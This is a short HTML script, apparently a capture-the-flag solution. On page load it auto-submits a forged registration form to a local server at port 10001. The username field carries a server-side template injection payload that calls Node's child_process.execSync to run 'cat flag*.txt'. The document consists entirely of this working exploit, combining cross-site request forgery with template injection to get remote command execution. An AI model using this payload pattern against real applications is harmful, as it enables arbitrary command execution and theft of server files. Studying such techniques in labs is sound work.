<script>
  window.onload = () => {
    const form = document.createElement("form");
    form.method = "POST";
    form.action = "http://localhost:10001/register";

    const u = document.createElement("input");
    u.name = "username";
    u.value = "<%= process.mainModule.require(\"child_process\").execSync(\"cat flag*.txt\").toString() %>";

    const p = document.createElement("input");
    p.name = "password";
    p.value = "123";

    form.appendChild(u);
    form.appendChild(p);

    document.body.appendChild(form);
    form.submit();
  };
</script>
